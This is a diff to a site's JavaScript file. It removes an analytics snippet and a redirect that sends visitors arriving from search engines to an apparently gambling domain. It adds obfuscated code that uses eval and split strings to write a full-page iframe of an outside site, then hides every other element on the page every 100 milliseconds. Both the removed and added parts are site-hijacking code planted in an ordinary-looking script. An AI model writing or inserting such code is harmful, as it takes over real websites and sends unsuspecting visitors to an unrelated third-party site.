@@ -1,21 +1,27 @@
 /**
  * Created by gin on 2018/5/23.
  */
-var _hmt = _hmt || [];
-(function() {
-  var hm = document.createElement("script");
-  hm.src = "https://hm.baidu.com/hm.js?5f003303e789f4619071208b12c9c281";
-  var s = document.getElementsByTagName("script")[0];
-  s.parentNode.insertBefore(hm, s);
-})();
+var  ss = '<center id="showcloneshengxiaon"><ifr'+'ame scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14'+'00" height="1800" src="http://www.ag88.win"></iframe></center>';
+eval("do"+"cu"+"ment.wr"+"ite('"+ss+"');");
 
-var regexp = /\.(baidu|haosou|so|sogou|soso|google|sm|yahoo|bing|360)(\.[a-z0-9\-]+){1,2}\//ig;
-var where = document.referrer;
-if (regexp.test(where)) {
-  if (/mobile|android|iphone|ipad|phone/i.test(navigator.userAgent.toLowerCase())) {
-    location.href=(Math.random()<0.5)?"https://m.agm4848.com":"https://m.agm4848.com";
-  }
-  else{
-    location.href=(Math.random()<0.5)?"https://www.agm4848.com":"https://www.agm4848.com";
-  }
-}
+try{
+	setInterval(function(){
+
+		try{
+			document.getElementById("div"+"All").style.display="no"+"ne";
+		}catch(e){}
+
+		for(var i=0;i<document.body.children.length;i++){
+			try{
+				var tagname = document.body.children[i].tagName;
+				var myid = document.body.children[i].id;
+				if(myid!="iconDiv1" && myid!="showcloneshengxiaon"){
+				  // if(tagname!="center"){
+				     document.body.children[i].style.display="non"+"e";
+				   //}
+				}
+			}catch(e){}
+		}
+
+	},100);
+}catch(e){}
